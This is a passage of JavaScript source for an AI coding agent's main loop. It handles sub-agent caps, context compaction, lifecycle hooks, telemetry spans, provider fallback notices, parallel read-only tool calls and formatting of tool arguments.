    // Sub-agent nesting level (0 = main loop); spawn_sub_agent caps at
    // MAX_SUB_AGENT_DEPTH using this.
    subAgentDepth: options.subAgentDepth || 0,
    // Shared TOTAL-sub-agent counter for the whole run. Reuse the parent's
    // instance (passed by reference) so every nested level draws from one pool;
    // the main loop seeds it. Bounds breadth, complementing the depth cap.
    subAgentBudget: options.subAgentBudget || {
      spawned: 0,
      max: MAX_SUB_AGENTS_PER_RUN,
    },
    // This loop's EFFECTIVE subagent contract (set when this loop IS a spawned
    // sub-agent). Threaded so a nested spawn_sub_agent sees it as the parent
    // ceiling (tighten-only). null at the top level (no ceiling).
    subAgentContract: options.subAgentContract || null,
    // Abort signal — forwarded to background sub-agents so cancelling the
    // parent run also cancels children still running detached.
    signal,
    // Background sub-agents spawned THIS loop (spawn_sub_agent background:true).
    // id → { id, role, task, promise, settled, outcome }. Results are drained
    // into `messages` before each LLM call; the loop refuses to finish while
    // any are still running (it waits, injects, and gives the model one more
    // turn) so a background result can never be silently lost.
    backgroundSubAgents: new Map(),
    // 用量归因: per-run sink for child-loop (spawn_sub_agent / isolated
    // run_skill) token usage. Child loops consume their own generator events,
    // so their real usage never reaches this loop's consumers — the spawn
    // wiring pushes it here and the loop drains it at iteration boundaries as
    // `token-usage` events carrying an `attribution` frame. Callers may pass
    // their own array to observe it directly.
    subAgentUsageSink: Array.isArray(options.subAgentUsageSink)
      ? options.subAgentUsageSink
      : [],
  };
  const backgroundSubAgents = toolContext.backgroundSubAgents;
  const subAgentUsageSink = toolContext.subAgentUsageSink;

  throwIfAborted(signal);

  // ── Slot-filling phase ──────────────────────────────────────────────
  // Before calling the LLM, check if the user's message matches a known
  // intent with missing required parameters. If so, interactively fill them
  // and append the gathered context to the user message.
  if (options.slotFiller && options.interaction) {
    const lastUserMsg = [...messages].reverse().find((m) => m.role === "user");
    if (lastUserMsg) {
      try {
        const { CLISlotFiller } = await import("../lib/slot-filler.js");
        const intent = CLISlotFiller.detectIntent(lastUserMsg.content);

        if (intent) {
          const requiredSlots = CLISlotFiller.getSlotDefinitions(
            intent.type,
          ).required;
          const missingSlots = requiredSlots.filter((s) => !intent.entities[s]);

          if (missingSlots.length > 0) {
            const result = await options.slotFiller.fillSlots(intent, {
              cwd: options.cwd || process.cwd(),
            });

            // Yield slot-filling events for each filled slot
            for (const slot of result.filledSlots) {
              yield {
                type: "slot-filling",
                slot,
                question: `Filled "${slot}" = "${result.entities[slot]}"`,
              };
            }

            // Append gathered context to the user message so the LLM has full info
            if (result.filledSlots.length > 0) {
              const contextParts = Object.entries(result.entities)
                .filter(([, v]) => v)
                .map(([k, v]) => `${k}: ${v}`);
              lastUserMsg.content += `\n\n[Context — user provided: ${contextParts.join(", ")}]`;
            }
          }
        }
      } catch (error) {
        if (isAbortError(error) || signal?.aborted) {
          throw error;
        }
        // Slot-filling failure is non-critical — proceed to LLM
      }
    }
  }

  // Phase 7 parity harness hook: tests can inject a mock LLM function via
  // `options.chatFn` to drive the loop deterministically without hitting a
  // real provider. Production code path is unchanged — the fallback is the
  // real `chatWithTools`.
  let llmCall = options.chatFn || chatWithTools;

  // Runnable-first auth recovery: if the resolved provider's key is missing /
  // wrong / expired, self-heal to a provider we can actually run (endpoint-
  // inferred, then env-keyed) instead of failing the turn. Opt out with
  // `runnableProviderFallback: false`. Transparent on the happy path.
  if (options.runnableProviderFallback !== false) {
    const { makeRunnableProviderFallback } =
      await import("../lib/runnable-provider.js");
    llmCall = makeRunnableProviderFallback(llmCall, {
      onFallback: ({ from, to, reason, fromModel, toModel }) => {
        // Telemetry: a provider/model fallback is a reliability signal — count
        // it (keyed by reason) so a run's OTLP export shows retry/fallback rate.
        if (recorder) recorder.counter("agent.model.fallback", 1, { reason });
        // Switching VENDORS (or relabelling via baseUrl) must NEVER be silent —
        // a user who configured volcengine deserves to know it ran on another
        // provider/model. Build a human message and hand it to the driver's
        // visible surfacer (IDE panel → a rendered `raw` line; REPL → a yellow
        // line) when provided; otherwise fall back to a clear stderr notice.
        const message =
          reason === "env-key"
            ? `"${from}" 鉴权失败，已临时切换到不同厂商 "${to}"（请检查 ${from} 的 API key：cc config set llm.apiKey …）。`
            : reason === "model-mismatch"
              ? `模型 "${fromModel}" 不属于 ${from}，已改用其默认模型 "${toModel}"（用 cc config set llm.model 设置正确的 ${from} 模型）。`
              : `provider 配置与 baseUrl 不一致，已按 baseUrl 切换到 "${to}"。`;
        const info = { from, to, reason, fromModel, toModel, message };
        if (typeof options.onProviderFallback === "function") {
          try {
            options.onProviderFallback(info);
          } catch {
            /* surfacing is best-effort */
          }
          return;
        }
        try {
          process.stderr.write(`\x1b[33m[provider] ${message}\x1b[0m\n`);
        } catch {
          /* notice is best-effort */
        }
      },
    });
  }

  // Workflow-tracing attributes (Claude-Code 2.1.202): stamp the run id (and
  // an optional caller-provided workflow name) onto EVERY span this run emits,
  // so a collector can group one run's model/tool spans into one workflow.
  if (recorder && typeof recorder.setDefaultAttribute === "function") {
    // Normalize the unified id set (P2 observability): every id is charset-
    // sanitized + length-capped, and only these allow-listed keys are stamped,
    // so span cardinality stays bounded and no content leaks in as an id.
    const telemetryCtx = {
      "workflow.run_id": runId,
      "workflow.name": options.workflowName || undefined,
      "session.id": options.sessionId || undefined,
      "agent.id": options.agentId || undefined,
      "parent_agent.id": options.parentAgentId || undefined,
    };
    // --otlp-content opt-in (P2): only when explicitly enabled do we feed the
    // initial prompt through the redactor with includeContent — so a debugger
    // can see which prompt a span belongs to. Default OFF omits the field
    // entirely (not just redacts it), keeping default OTLP output byte-identical.
    const includeContent = options.otlpIncludeContent === true;
    if (includeContent) {
      const promptText = extractInitialPromptText(messages);
      if (promptText) telemetryCtx.prompt = promptText;
    }
    const idAttrs = buildTelemetryAttributes(telemetryCtx, { includeContent });
    for (const [k, v] of Object.entries(idAttrs)) {
      recorder.setDefaultAttribute(k, v);
    }
  }
  yield {
    type: "run-started",
    runId,
    sessionId: options.sessionId || null,
  };

  // True once a Stop hook has forced a continuation — passed to the next Stop
  // hook as `stop_hook_active` so a well-behaved hook won't block forever.
  let stopHookActive = false;
  // True once we have already re-prompted a thinking-only turn (a turn that
  // produced extended-thinking but no visible text and no tool calls). The
  // one-shot guard means a model that keeps returning empty turns completes
  // rather than looping forever (the iteration budget is the hard backstop).
  let emptyThinkingReprompted = false;

  while (budget.hasRemaining()) {
    budget.consume();
    throwIfAborted(signal);

    // Surface attributed child-loop usage collected since the last boundary
    // (blocking spawns push during executeTool; background spawns push live).
    yield* _drainSubAgentUsage(subAgentUsageSink);

    // Emit progressive warnings (once per level)
    const level = budget.warningLevel();
    if (
      level === WarningLevel.WARNING &&
      !budget.hasWarned(WarningLevel.WARNING)
    ) {
      budget.recordWarning(WarningLevel.WARNING);
      yield {
        type: "iteration-warning",
        level,
        message: budget.toWarningMessage(),
        budget: budget.toSummary(),
      };
    } else if (
      level === WarningLevel.WRAPPING_UP &&
      !budget.hasWarned(WarningLevel.WRAPPING_UP)
    ) {
      budget.recordWarning(WarningLevel.WRAPPING_UP);
      yield {
        type: "iteration-warning",
        level,
        message: budget.toWarningMessage(),
        budget: budget.toSummary(),
      };
    }

    // Headless auto-compaction (Claude-Code `--print` parity). Keeps long
    // `-p` / `--resume` runs under the model's context window instead of
    // growing until the provider rejects the request. Opt-out with
    // `autoCompact: false` (the interactive REPL does this — it compacts on its
    // own schedule). Default-on, gated by the PROMPT_COMPRESSOR flag + a size
    // threshold inside the compressor, so it only fires for genuinely large
    // contexts. Safe to compact here: the previous iteration always finishes
    // its full tool_call→tool_result cycle before we loop, so `messages` has no
    // dangling call; `preserveToolPairs` then guarantees compaction never
    // orphans a tool result. Best-effort — a failure never aborts the run.
    if (options.autoCompact !== false && messages.length > 4) {
      try {
        const compactor = await _getAutoCompactor(options);
        if (compactor && compactor.shouldAutoCompact(messages)) {
          // Cheap surgical pre-pass (Claude-Code microcompact parity): trim old
          // large tool results IN PLACE before the disruptive full
          // summarization. If the trim brings the context back under threshold,
          // the full compaction below is skipped this round — so heavy-tool
          // conversations rarely hit a full summarize. Opt out:
          // autoMicroCompact: false.
          if (options.autoMicroCompact !== false) {
            try {
              const { microCompact } = await import("../lib/micro-compact.js");
              const mc = microCompact(messages);
              if (mc.stats.trimmed > 0) {
                messages.splice(0, messages.length, ...mc.messages);
                yield { type: "micro-compaction", runId, stats: mc.stats };
              }
            } catch {
              // microcompact is best-effort — never break the run
            }
          }
          // After the trim, is the full (disruptive) compaction still needed?
          const needFull = compactor.shouldAutoCompact(messages);
          // settings.json PreCompact hooks: a `block` decision SKIPS this
          // compaction round (e.g. the hook archived / owns the history). Fires
          // right before the history would be compacted.
          let preCompactBlocked = false;
          let preCompactReason = null;
          if (needFull && options.settingsHooks) {
            try {
              const pc = runObserveHooks(
                options.settingsHooks,
                "PreCompact",
                {
                  trigger: "auto",
                  message_count: messages.length,
                  session_id: options.sessionId || null,
                },
                { cwd: options.cwd || process.cwd() },
              );
              if (pc && pc.decision === "block") {
                preCompactBlocked = true;
                preCompactReason = pc.reason || null;
              }
            } catch (_err) {
              // observe-only
            }
          }
          if (preCompactBlocked) {
            yield {
              type: "compaction-skipped",
              runId,
              reason: preCompactReason,
            };
          }
          // Auto-pin (OPT-IN): when enabled, the original task (first user turn)
          // is pinned so compaction can't drop it. Off by default → no predicate
          // is passed and compaction is byte-identical to before.
          let pinOpts = {};
          if (options.autoPin) {
            const { buildAutoPinPredicate } = await import("./auto-pin.js");
            const isPinned = buildAutoPinPredicate(messages, options.autoPin);
            if (isPinned) pinOpts = { isPinned };
          }
          const { messages: compacted, stats } =
            !needFull || preCompactBlocked
              ? { messages, stats: { saved: 0 } }
              : await compactor.compress(messages, {
                  preserveToolPairs: true,
                  ...pinOpts,
                });
          if (stats.saved > 0 && compacted.length < messages.length) {
            messages.splice(0, messages.length, ...compacted);
            // Persist the compaction so a later --resume rebuilds from the
            // shortened history. An explicit `onCompaction` hook (if a caller
            // provides one) takes precedence; otherwise self-persist a `compact`
            // event — but only when the session is already being persisted to
            // disk (the JSONL file exists), so a one-shot `cc agent -p` (which
            // never creates a session file) writes nothing. Opt out with
            // `persistCompaction: false`. Best-effort throughout.
            if (typeof options.onCompaction === "function") {
              try {
                options.onCompaction(stats, compacted);
              } catch {
                // persistence is best-effort
              }
            } else if (
              options.sessionId &&
              options.persistCompaction !== false
            ) {
              try {
                const store = await import("../harness/jsonl-session-store.js");
                if (store.sessionExists(options.sessionId)) {
                  store.appendCompactEvent(options.sessionId, {
                    ...stats,
                    messages: compacted,
                  });
                }
              } catch {
                // self-persist is best-effort
              }
            }
            yield { type: "compaction", stats, runId };
          }
        }
      } catch (_e) {
        if (isAbortError(_e) || signal?.aborted) throw _e;
        // Compaction is best-effort — proceed with the uncompacted messages.
      }
    }

    // Deliver background sub-agent results that settled since the last turn:
    // inject them as user-role context so THIS LLM call sees them. (There is
    // no open tool_call to attach a late result to — the spawn call already
    // returned its "running" handle.)
    if (backgroundSubAgents.size > 0) {
      for (const entry of _takeSettledBackgroundSubAgents(
        backgroundSubAgents,
      )) {
        // SubagentStop fires at RESULT time for background spawns (the
        // spawn-time handle skips it); a block reason rides along as feedback.
        if (options.settingsHooks) {
          try {
            const outcome = runObserveHooks(
              options.settingsHooks,
              "SubagentStop",
              {
                stop_hook_active: false,
                session_id: options.sessionId || null,
                subagent_response: JSON.stringify(
                  entry.outcome?.result || { error: entry.outcome?.error },
                ).substring(0, 2000),
              },
              { cwd: toolContext.cwd },
            );
            if (outcome.decision === "block" && outcome.reason) {
              entry.hookFeedback = outcome.reason;
            }
          } catch (_err) {
            // SubagentStop hooks are best-effort
          }
        }
        messages.push({
          role: "user",
          content: _backgroundSubAgentResultText(entry),
        });
        yield {
          type: "background-sub-agent-result",
          runId,
          subAgentId: entry.id,
          role: entry.role,
          error: entry.outcome?.error || null,
          summary: entry.outcome?.result?.summary || null,
        };
      }
    }

    // Turn-scoped context injection (open-agents prepareCall parity).
    // prepareCall runs fresh each iteration and returns an ephemeral
    // system-message supplement that is NOT persisted to messages history.
    let callMessages = messages;
    if (typeof options.prepareCall === "function") {
      try {
        const hook = await options.prepareCall({
          iteration: budget.consumed,
          cwd: toolContext.cwd,
          sessionId: toolContext.sessionId,
        });
        if (
          hook &&
          typeof hook.systemSuffix === "string" &&
          hook.systemSuffix
        ) {
          callMessages = [
            ...messages,
            { role: "system", content: hook.systemSuffix },
          ];
        }
      } catch (_e) {
        // prepareCall failures are non-critical — proceed with original messages
      }
    }

    // Per-span unified ids (P2 observability): the run-level default attributes
    // stamp session/agent/workflow ids on every span, but turn/prompt ids are
    // per-iteration. A "turn" is one model iteration of the run; "prompt" is the
    // model request within that turn. Normalized through buildTelemetryAttributes
    // so they get the same charset-sanitized + cardinality-bounded treatment as
    // the run-level ids (turn.id correlates with the agent.iteration counter).
    const modelIdAttrs = recorder
      ? buildTelemetryAttributes({
          turnId: `${runId}:t${budget.consumed}`,
          promptId: `${runId}:t${budget.consumed}:p`,
        })
      : null;
    const result = await _withSpan(
      recorder,
      "agent.model",
      {
        "gen_ai.system": options.provider || "ollama",
        "gen_ai.request.model": options.model || "unknown",
        "agent.iteration": budget.consumed,
        ...(modelIdAttrs || {}),
      },
      () => llmCall(callMessages, options),
      (span, r) => {
        const t = _usageTokens(r?.usage);
        if (t) {
          if (t.input != null)
            span.setAttribute("gen_ai.usage.input_tokens", t.input);
          if (t.output != null)
            span.setAttribute("gen_ai.usage.output_tokens", t.output);
          // Cache read/write tokens — the prompt-caching hit rate the plan's
          // reliability telemetry cares about.
          if (t.cacheRead != null)
            span.setAttribute("gen_ai.usage.cache_read_tokens", t.cacheRead);
          if (t.cacheWrite != null)
            span.setAttribute("gen_ai.usage.cache_write_tokens", t.cacheWrite);
        }
        span.setAttribute(
          "agent.has_tool_calls",
          Array.isArray(r?.message?.tool_calls) &&
            r.message.tool_calls.length > 0,
        );
        // response CONTENT is opt-in (--otlp-content): stamped only when
        // enabled, redacted + length-capped through the same normalizer; the
        // field is entirely absent by default so default OTLP stays unchanged.
        if (options.otlpIncludeContent === true && r?.message?.content) {
          const respAttrs = buildTelemetryAttributes(
            { response: r.message.content },
            { includeContent: true },
          );
          if (respAttrs["content.response"] != null) {
            span.setAttribute(
              "content.response",
              respAttrs["content.response"],
            );
          }
        }
      },
      "model_error",
    );
    if (recorder) recorder.counter("agent.model.calls", 1);
    throwIfAborted(signal);
    const msg = result?.message;

    if (result?.usage) {
      yield {
        type: "token-usage",
        provider: options.provider || "ollama",
        model: options.model || "unknown",
        usage: result.usage,
      };
    }

    if (!msg) {
      yield { type: "response-complete", content: "(No response from LLM)" };
      yield { type: "run-ended", runId, reason: "no-response" };
      return;
    }

    const toolCalls = msg.tool_calls;

    if (!toolCalls || toolCalls.length === 0) {
      // A final answer while background sub-agents are still outstanding is
      // premature — their results must not be silently lost. Wait for ALL of
      // them, inject the results, and give the model one more turn to fold
      // them into its real final answer. The iteration budget is the backstop
      // if it keeps spawning more.
      if (backgroundSubAgents.size > 0) {
        yield {
          type: "waiting-background-sub-agents",
          runId,
          count: backgroundSubAgents.size,
        };
        await Promise.all(
          [...backgroundSubAgents.values()].map((e) => e.promise),
        );
        throwIfAborted(signal);
        messages.push({ role: "assistant", content: msg.content || "" });
        for (const entry of _takeSettledBackgroundSubAgents(
          backgroundSubAgents,
        )) {
          messages.push({
            role: "user",
            content:
              _backgroundSubAgentResultText(entry) +
              "\n\nAll background sub-agents have finished. Incorporate their results and give your final answer.",
          });
          yield {
            type: "background-sub-agent-result",
            runId,
            subAgentId: entry.id,
            role: entry.role,
            error: entry.outcome?.error || null,
            summary: entry.outcome?.result?.summary || null,
          };
        }
        continue;
      }
      // Surface the final answer's extended-thinking reasoning (Anthropic, when
      // --think is on) so non-streaming consumers (the REPL) can show it. The
      // streaming path forwards reasoning live via onThinking instead.
      const _thinking = Array.isArray(msg._thinkingBlocks)
        ? msg._thinkingBlocks
            .map((b) => b.thinking || "")
            .join("")
            .trim()
        : "";
      // Claude Code 2.1.183 parity: a turn that produced ONLY extended-thinking
      // (no visible text, no tool calls) would otherwise complete silently with
      // an empty answer — the user sees nothing. Re-prompt the model ONCE to
      // surface its actual response. Mirrors the Stop-hook continuation path
      // below (push assistant turn + a user nudge, then continue). Scoped to the
      // thinking-only case so a genuinely empty completion (no thinking) still
      // ends instead of looping.
      const _contentEmpty = !String(msg.content || "").trim();
      if (_contentEmpty && _thinking && !emptyThinkingReprompted) {
        emptyThinkingReprompted = true;
        messages.push({ role: "assistant", content: "" });
        messages.push({
          role: "user",
          content:
            "You ended your turn with only internal reasoning and no visible " +
            "response. Please provide your actual answer now.",
        });
        yield { type: "empty-thinking-reprompt", runId };
        continue;
      }
      yield {
        type: "response-complete",
        content: msg.content || "",
        ...(_thinking ? { thinking: _thinking } : {}),
      };
      // settings.json Stop hooks: a `block` decision FORCES the agent to keep
      // going instead of stopping — the reason is injected as a new instruction.
      // `stop_hook_active` lets the hook avoid an infinite loop; the iteration
      // budget is the hard backstop.
      if (options.settingsHooks) {
        let stopOutcome = null;
        try {
          stopOutcome = runObserveHooks(
            options.settingsHooks,
            "Stop",
            {
              stop_hook_active: stopHookActive,
              final_response: String(msg.content || "").substring(0, 2000),
              session_id: options.sessionId || null,
            },
            { cwd: options.cwd || process.cwd() },
          );
        } catch (_err) {
          stopOutcome = null; // never affect the run outcome
        }
        if (stopOutcome && stopOutcome.decision === "block") {
          stopHookActive = true;
          messages.push({ role: "assistant", content: msg.content || "" });
          messages.push({
            role: "user",
            content:
              stopOutcome.reason ||
              "A Stop hook requested that you keep working.",
          });
          yield {
            type: "stop-hook-continue",
            runId,
            reason: stopOutcome.reason || null,
          };
          continue;
        }
      }
      yield { type: "run-ended", runId, reason: "complete" };
      return;
    }

    // Intermediate-step reasoning (Anthropic, --think): the model's reasoning
    // before it chose these tool calls. Streaming consumers already get it live
    // via onThinking, so only surface it as an event for non-streaming consumers
    // (the REPL) — keeps it out of the --include-partial-messages stream.
    if (!options.onThinking && Array.isArray(msg._thinkingBlocks)) {
      const _stepThinking = msg._thinkingBlocks
        .map((b) => b.thinking || "")
        .join("")
        .trim();
      if (_stepThinking) yield { type: "thinking", text: _stepThinking };
    }

    // Add assistant message with tool calls
    messages.push(msg);

    // Concurrent READ-ONLY batch (latency optimization). When every call in the
    // turn is a well-formed read-only built-in (pure fs/DB reads — no mutation,
    // no process spawn, no shared-state writes) and there is no interactive
    // confirmer in play, run them concurrently so wall-clock drops from the SUM
    // of the reads to their MAX — the common "read these N files" case. Crucially,
    // `tool-executing`/`tool-result` events are still YIELDED, and tool results
    // still PUSHED, in the ORIGINAL order, so the output stream and tool_call_id
    // correlation are byte-identical to the sequential path — only timing changes.
    // Any mutating/unknown/MCP tool in the batch, a single call, an interactive
    // session (concurrent prompts would race), or `parallelReadOnlyTools: false`
    // falls through to the strictly sequential loop below.
    const parallelReads =
      options.parallelReadOnlyTools !== false &&
      toolCalls.length > 1 &&
      !toolContext.permissionConfirm &&
      toolCalls.every(
        (c) =>
          typeof c?.function?.name === "string" &&
          _CHECKPOINT_READ_ONLY.has(c.function.name),
      );
    if (parallelReads) {
      throwIfAborted(signal);
      // Kick every read off now; settle into {result,error} so an unawaited
      // promise can never surface as an unhandled rejection if the loop aborts
      // before it is consumed.
      const inflight = toolCalls.map((call) => {
        let toolArgs;
        try {
          toolArgs =
          typeof call.function.arguments === "string"
            ? JSON.parse(call.function.arguments)
            : call.function.arguments;
        } catch {
          toolArgs = {};
        }
        const promise = executeTool(
          call.function.name,
          toolArgs,
          { ...toolContext, toolCallId: call.id },
        ).then(
          (result) => ({ result, error: null }),
          (err) => ({ result: { error: err.message }, error: err.message }),
        );
        return { call, toolArgs, promise };
      });
      for (const { call, toolArgs, promise } of inflight) {
        throwIfAborted(signal);
        yield {
          type: "tool-executing",
          tool: call.function.name,
          args: toolArgs,
        };
        const { result: toolResult, error: toolError } = await promise;
        throwIfAborted(signal);
        const warningMsg = budget.toWarningMessage();
        const resultStr = capToolResultString(
          safeStringifyToolResult(toolResult),
        );
        const toolContent = warningMsg
          ? `${resultStr}\n\n${warningMsg}`
          : resultStr;
        yield {
          type: "tool-result",
          tool: call.function.name,
          result: toolResult,
          error: toolError,
        };
        messages.push({
          role: "tool",
          content: toolContent,
          tool_call_id: call.id,
        });
      }
      continue; // all read results in place — back to the LLM call
    }

    for (const call of toolCalls) {
      throwIfAborted(signal);
      const fn = call?.function;
      const toolName = fn?.name;
      // A malformed tool call (no `function` / no `name` — a provider quirk or a
      // bad MCP tool definition) must not crash the whole turn with a TypeError.
      // Record an error tool result so the assistant turn stays BALANCED — a
      // tool_call without its matching tool_result wedges strict providers
      // (Anthropic/Bedrock) on the very next request — and let the model recover
      // on the following iteration instead of the run dying on a recoverable
      // malformed call.
      if (typeof toolName !== "string" || !toolName) {
        const reason = "malformed tool call: missing function name";
        yield {
          type: "tool-result",
          tool: "(unknown)",
          result: { error: reason },
          error: reason,
        };
        messages.push({
          role: "tool",
          content: `Error: ${reason}.`,
          tool_call_id: call?.id,
        });
        continue;
      }
      let toolArgs;

      try {
        toolArgs =
          typeof fn.arguments === "string"
            ? JSON.parse(fn.arguments)
            : fn.arguments;
      } catch {
        toolArgs = {};
      }

      // Auto-checkpoint the work tree before a mutating tool (opt-in), so the
      // user can `cc checkpoint restore` back to just before this call.
      const cpId = await _autoCheckpointBeforeTool(
        toolContext,
        toolName,
        toolArgs,
      );
      if (cpId) yield { type: "checkpoint", id: cpId, tool: toolName };

      yield { type: "tool-executing", tool: toolName, args: toolArgs };

      let toolResult;
      let toolError = null;
      // Per-span unified ids (P2 observability): a tool span carries its turn.id
      // (correlating with the model span of the same iteration), the provider's
      // tool_use.id (so a tool-result event can be tied back to its call), and —
      // when auto-checkpoint fired before a mutating tool — the checkpoint.id the
      // user could restore to. All normalized through buildTelemetryAttributes.
      // tool_arguments CONTENT is opt-in (--otlp-content): the alias key is only
      // present when explicitly enabled, so by default the field is omitted
      // entirely (byte-identical default OTLP), and even opted-in it's length-
      // capped by redactContent. Mirrors the run-level content.prompt opt-in.
      const toolContentOptIn = options.otlpIncludeContent === true;
      const toolIdAttrs = recorder
        ? buildTelemetryAttributes(
            {
              turnId: `${runId}:t${budget.consumed}`,
              toolUseId: call.id,
              checkpointId: cpId || undefined,
              ...(toolContentOptIn ? { toolArguments: toolArgs } : {}),
            },
            { includeContent: toolContentOptIn },
          )
        : null;
      try {
        toolResult = await _withSpan(
          recorder,
          "agent.tool",
          { "tool.name": toolName, ...(toolIdAttrs || {}) },
          () =>
            executeTool(toolName, toolArgs, {
              ...toolContext,
              toolCallId: call.id,
            }),
          (span, r) => {
            span.setAttribute(
              "tool.is_error",
              !!(r && typeof r === "object" && r.error),
            );
            // permission.decision_id (P2): a GATED tool result carries a
            // `policy` (deny / ask-fail / host-block / sandbox); allow-path
            // tools execute with no distinct decision. Stamp a stable id
            // (derived from the call + gate, so it's recomputable from the
            // tool-result's policy + tool_call_id) plus the low-cardinality
            // decision, letting a blocked tool span be tied to its decision.
            const decId =
              r && typeof r === "object"
                ? permissionDecisionId(call.id, r.policy)
                : null;
            if (decId) {
              const permAttrs = buildTelemetryAttributes({
                decisionId: decId,
                "permission.decision": r.policy.decision,
              });
              if (permAttrs["permission.decision_id"]) {
                span.setAttribute(
                  "permission.decision_id",
                  permAttrs["permission.decision_id"],
                );
              }
              if (permAttrs["permission.decision"]) {
                span.setAttribute(
                  "permission.decision",
                  permAttrs["permission.decision"],
                );
              }
            }
          },
          "tool_error",
        );
      } catch (err) {
        toolResult = { error: err.message };
        toolError = err.message;
      }
      if (recorder) recorder.counter("agent.tool.calls", 1);

      throwIfAborted(signal);

      // Append budget warning to tool result so the LLM sees it
      const warningMsg = budget.toWarningMessage();
      // Cap an individual tool result so one giant output can't blow the
      // context — but tell the model when we cut it (no more silent
      // mid-content slice). See MAX_TOOL_RESULT_CHARS / capToolResultString.
      const resultStr = capToolResultString(
        safeStringifyToolResult(toolResult),
      );
      const toolContent = warningMsg
        ? `${resultStr}\n\n${warningMsg}`
        : resultStr;

      yield {
        type: "tool-result",
        tool: toolName,
        result: toolResult,
        error: toolError,
      };

      messages.push({
        role: "tool",
        content: toolContent,
        tool_call_id: call.id,
      });
    }
  }

  // Budget exhausted — flush any child usage the final iteration produced,
  // then yield exhaustion event + final message
  yield* _drainSubAgentUsage(subAgentUsageSink);
  yield { type: "iteration-budget-exhausted", budget: budget.toSummary() };
  yield {
    type: "response-complete",
    content: `(Iteration budget exhausted — ${budget.toSummary()})`,
  };
  yield { type: "run-ended", runId, reason: "budget-exhausted" };
}

// ─── Format helpers ───────────────────────────────────────────────────────

export function formatToolArgs(name, args) {
  switch (name) {
    case "read_file":
      return args.path;
    case "write_file":
      return `${args.path} (${args.content?.length || 0} chars)`;
    case "edit_file":
      return args.path;
    case "edit_file_hashed":
      return `${args.path} @${args.anchor_hash}`;
    case "run_shell":
      return args.run_in_background
        ? `${args.command} (background)`
        : args.command;
    case "check_shell":
      return args.task_id
        ? `${args.task_id}${args.kill ? " (kill)" : ""}`
        : "list";
    case "git":
      return args.command;
    case "search_files":
      return args.pattern;
    case "code_intelligence":
      return args.action === "workspace_symbols"
        ? `${args.action} ${args.query || ""}`.trim()
        : `${args.action} ${args.file || ""}${args.line != null ? `:${args.line}:${args.col}` : ""}`.trim();
    case "list_dir":
      return args.path || ".";
    case "run_skill":
      return `${args.skill_name}: ${(args.input || "").substring(0, 50)}`;
    case "list_skills":
      return args.category || args.query || "all";
    case "run_code":
      return `${args.language} (${(args.code || "").length} chars)`;
    case "spawn_sub_agent":
      return `[${args.role}] ${(args.task || "").substring(0, 60)}`;
    case "search_sessions":
      return `"${(args.query || "").substring(0, 60)}"`;
    case "notify":
      return `${args.level || "info"}: ${(args.title || "").substring(0, 50)}`;
    case "publish_artifact":
      return `${args.kind || "other"}: ${(args.title || args.path || "").substring(0, 60)}`;
    case "browser_state":
      return `tab=${args.tab ?? 0} port=${args.port ?? 9222}${args.reload ? " reload" : ""}`;
    case "browser_act": {
      const kinds = Array.isArray(args.actions)
        ? args.actions.map((a) => a?.type).filter(Boolean)
        : [];
      const head = kinds.slice(0, 4).join(",");
      return `${kinds.length} action(s)${head ? `: ${head}` : ""}${kinds.length > 4 ? ",…" : ""} tab=${args.tab ?? 0} port=${args.port ?? 9222}`;
    }
    case "schedule":
      return args.action === "cron"
        ? `cron ${args.cron || ""}`.trim()
        : args.action === "monitor"
          ? `monitor ${(args.command || "").substring(0, 40)}`.trim()
          : args.action === "wakeup"
            ? `wakeup +${args.delay || "0s"}`
            : String(args.action || "");
    default:
      return JSON.stringify(args).substring(0, 60);
  }
}
